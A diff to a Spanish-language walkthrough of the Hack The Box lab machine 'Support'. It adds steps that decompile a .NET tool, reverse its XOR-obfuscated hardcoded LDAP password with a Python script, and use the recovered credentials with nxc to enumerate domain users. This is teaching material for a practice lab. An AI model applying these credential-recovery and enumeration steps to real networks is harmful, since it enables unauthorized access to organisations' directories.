@@ -19,9 +19,6 @@ Escaneamos todos los puertos con `nmap` para ver cuáles están abiertos y qué 
 
 ```bash
 sudo nmap -p- -sS --min-rate 5000 -Pn -n -vv -oA nmap/allports 10.129.230.181
-sudo nmap -p- -sS --min-rate 5000 -Pn -n -vv -oA nmap/allports 10.129.230.181
-sudo nmap -p- -sS --min-rate 5000 -Pn -n -vv -oA nmap/allports 10.129.230.181
-sudo nmap -p- -sS --min-rate 5000 -Pn -n -vv -oA nmap/allports 10.129.230.181
 ```
 
 ```plaintext
@@ -163,3 +160,238 @@ Y extraemos el contenido del archivo descargado en el directorio creado.
 ```bash
 unzip UserInfo.exe.zip -d UserInfo/
 ```
+
+Listamos el contenido del directorio `UserInfo`.
+
+```plaintext
+total 664
+-rw-rw-rw- 1 melvin melvin  99840 Mar  1  2022 CommandLineParser.dll
+-rw-rw-rw- 1 melvin melvin  22144 Oct 22  2021 Microsoft.Bcl.AsyncInterfaces.dll
+-rw-rw-rw- 1 melvin melvin  47216 Oct 22  2021 Microsoft.Extensions.DependencyInjection.Abstractions.dll
+-rw-rw-rw- 1 melvin melvin  84608 Oct 22  2021 Microsoft.Extensions.DependencyInjection.dll
+-rw-rw-rw- 1 melvin melvin  64112 Oct 22  2021 Microsoft.Extensions.Logging.Abstractions.dll
+-rw-rw-rw- 1 melvin melvin  20856 Feb 19  2020 System.Buffers.dll
+-rw-rw-rw- 1 melvin melvin 141184 Feb 19  2020 System.Memory.dll
+-rw-rw-rw- 1 melvin melvin 115856 May 15  2018 System.Numerics.Vectors.dll
+-rw-rw-rw- 1 melvin melvin  18024 Oct 22  2021 System.Runtime.CompilerServices.Unsafe.dll
+-rw-rw-rw- 1 melvin melvin  25984 Feb 19  2020 System.Threading.Tasks.Extensions.dll
+-rwxrwxrwx 1 melvin melvin  12288 May 27  2022 UserInfo.exe
+-rw-rw-rw- 1 melvin melvin    563 May 27  2022 UserInfo.exe.config
+```
+
+Hay un ejecutable `UserInfo.exe`.
+
+```bash
+file UserInfo.exe
+```
+
+```plaintext
+UserInfo.exe: PE32 executable for MS Windows 6.00 (console), Intel i386 Mono/.Net assembly, 3 sections
+```
+
+Lo decompilamos con [AvaloniaILSpy](https://github.com/icsharpcode/AvaloniaILSpy).
+
+```bash
+git clone https://github.com/icsharpcode/AvaloniaILSpy
+```
+
+Encontramos información relevante.
+
+![Class Protected](@images/writeups/hackthebox/machines/support/support-avaloniailspy-protected.png)
+
+```csharp
+internal class Protected
+{
+	private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
+
+	private static byte[] key = Encoding.ASCII.GetBytes("armando");
+
+	public static string getPassword()
+	{
+		byte[] array = Convert.FromBase64String(enc_password);
+		byte[] array2 = array;
+		for (int i = 0; i < array.Length; i++)
+		{
+			array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
+		}
+		return Encoding.Default.GetString(array2);
+	}
+}
+```
+
+![Class LdapQuery](@images/writeups/hackthebox/machines/support/support-avaloniailspy-ldapquery.png)
+
+```csharp
+internal class LdapQuery
+{
+	private DirectoryEntry entry;
+
+	private DirectorySearcher ds;
+
+	public LdapQuery()
+	{
+		//IL_0018: Unknown result type (might be due to invalid IL or missing references)
+		//IL_0022: Expected O, but got Unknown
+		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
+		//IL_003f: Expected O, but got Unknown
+		string password = Protected.getPassword();
+		entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
+		entry.set_AuthenticationType((AuthenticationTypes)1);
+		ds = new DirectorySearcher(entry);
+	}
+
+	public void query(string first, string last, bool verbose = false)
+	{
+		//IL_011e: Unknown result type (might be due to invalid IL or missing references)
+		try
+		{
+			if (first == null && last == null)
+			{
+				Console.WriteLine("[-] At least one of -first or -last is required.");
+				return;
+			}
+			string text = ((last == null) ? ("(givenName=" + first + ")") : ((first != null) ? ("(&(givenName=" + first + ")(sn=" + last + "))") : ("(sn=" + last + ")")));
+			if (verbose)
+			{
+				Console.WriteLine("[*] LDAP query to use: " + text);
+			}
+			ds.set_Filter(text);
+			ds.get_PropertiesToLoad().Add("sAMAccountName");
+			SearchResultCollection val = ds.FindAll();
+			if (val.get_Count() == 0)
+			{
+				Console.WriteLine("[-] No users identified with that query.");
+				return;
+			}
+			if (verbose)
+			{
+				string text2 = "[+] Found " + val.get_Count() + " result";
+				if (val.get_Count() > 1)
+				{
+					text2 += "s";
+				}
+				text2 += ":";
+				Console.WriteLine(text2);
+			}
+			foreach (SearchResult item in val)
+			{
+				if (verbose)
+				{
+					Console.Write("       ");
+				}
+				Console.WriteLine(item.get_Properties().get_Item("sAMAccountName").get_Item(0));
+			}
+		}
+		catch (Exception ex)
+		{
+			Console.WriteLine("[-] Exception: " + ex.Message);
+		}
+	}
+
+	public void printUser(string username, bool verbose = false)
+	{
+		try
+		{
+			if (verbose)
+			{
+				Console.WriteLine("[*] Getting data for " + username);
+			}
+			ds.set_Filter("sAMAccountName=" + username);
+			ds.get_PropertiesToLoad().Add("pwdLastSet");
+			ds.get_PropertiesToLoad().Add("lastLogon");
+			ds.get_PropertiesToLoad().Add("givenName");
+			ds.get_PropertiesToLoad().Add("sn");
+			ds.get_PropertiesToLoad().Add("mail");
+			SearchResult val = ds.FindOne();
+			if (val == null)
+			{
+				Console.WriteLine("[-] Unable to locate " + username + ". Please try the find command to get the user's username.");
+				return;
+			}
+			if (((ReadOnlyCollectionBase)(object)val.get_Properties().get_Item("givenName")).Count > 0)
+			{
+				Console.WriteLine("First Name:           " + val.get_Properties().get_Item("givenName").get_Item(0));
+			}
+			if (((ReadOnlyCollectionBase)(object)val.get_Properties().get_Item("sn")).Count > 0)
+			{
+				Console.WriteLine("Last Name:            " + val.get_Properties().get_Item("sn").get_Item(0));
+			}
+			if (((ReadOnlyCollectionBase)(object)val.get_Properties().get_Item("mail")).Count > 0)
+			{
+				Console.WriteLine("Contact:              " + val.get_Properties().get_Item("mail").get_Item(0));
+			}
+			if (val.get_Properties().Contains("pwdLastSet"))
+			{
+				Console.WriteLine("Last Password Change: " + DateTime.FromFileTime((long)val.get_Properties().get_Item("pwdLastSet").get_Item(0)));
+			}
+		}
+		catch (Exception ex)
+		{
+			Console.WriteLine("[-] Exception: " + ex.Message);
+		}
+	}
+}
+```
+
+Con esta información podemos obtener la contraseña haciendo el proceso inverso con Python.
+
+`getpass.py`
+
+```python
+import base64
+
+def get_password():
+    enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
+    key = b"armando"
+    data = base64.b64decode(enc_password)
+    decrypted = bytearray(len(data))
+    for i in range(len(data)):
+        decrypted[i] = (data[i] ^ key[i % len(key)]) ^ 0xDF
+    return decrypted.decode('utf-8')
+
+if __name__ == "__main__":
+    print(get_password())
+```
+
+```bash
+python3 getpass.py
+```
+
+```plaintext
+nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
+```
+
+Con las credenciales obtenidas enumeramos usuarios mediante el servicio `ldap`.
+
+```bash
+nxc ldap support.htb -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --users
+```
+
+```plaintext
+LDAP        10.129.230.181  389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb) (signing:None) (channel binding:No TLS cert) 
+LDAP        10.129.230.181  389    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz 
+LDAP        10.129.230.181  389    DC               [*] Enumerated 20 domain users: support.htb
+LDAP        10.129.230.181  389    DC               -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
+LDAP        10.129.230.181  389    DC               Administrator                 2022-07-19 14:55:56 0        Built-in account for administering the computer/domain      
+LDAP        10.129.230.181  389    DC               Guest                         2022-05-28 08:18:55 0        Built-in account for guest access to the computer/domain    
+LDAP        10.129.230.181  389    DC               krbtgt                        2022-05-28 08:03:43 0        Key Distribution Center Service Account                     
+LDAP        10.129.230.181  389    DC               ldap                          2022-05-28 08:11:46 0                                                                    
+LDAP        10.129.230.181  389    DC               support                       2022-05-28 08:12:00 0                                                                    
+LDAP        10.129.230.181  389    DC               smith.rosario                 2022-05-28 08:12:19 0                                                                    
+LDAP        10.129.230.181  389    DC               hernandez.stanley             2022-05-28 08:12:34 0                                                                    
+LDAP        10.129.230.181  389    DC               wilson.shelby                 2022-05-28 08:12:50 0                                                                    
+LDAP        10.129.230.181  389    DC               anderson.damian               2022-05-28 08:13:05 0                                                                    
+LDAP        10.129.230.181  389    DC               thomas.raphael                2022-05-28 08:13:21 0                                                                    
+LDAP        10.129.230.181  389    DC               levine.leopoldo               2022-05-28 08:13:37 0                                                                    
+LDAP        10.129.230.181  389    DC               raven.clifton                 2022-05-28 08:13:53 0                                                                    
+LDAP        10.129.230.181  389    DC               bardot.mary                   2022-05-28 08:14:08 0                                                                    
+LDAP        10.129.230.181  389    DC               cromwell.gerard               2022-05-28 08:14:24 0                                                                    
+LDAP        10.129.230.181  389    DC               monroe.david                  2022-05-28 08:14:39 0                                                                    
+LDAP        10.129.230.181  389    DC               west.laura                    2022-05-28 08:14:55 0                                                                    
+LDAP        10.129.230.181  389    DC               langley.lucy                  2022-05-28 08:15:10 0                                                                    
+LDAP        10.129.230.181  389    DC               daughtler.mabel               2022-05-28 08:15:26 0                                                                    
+LDAP        10.129.230.181  389    DC               stoll.rachelle                2022-05-28 08:15:42 0                                                                    
+LDAP        10.129.230.181  389    DC               ford.victoria                 2022-05-28 08:15:58 0
+```
+
+Guardamos los usuarios en un archivo `users.txt`.
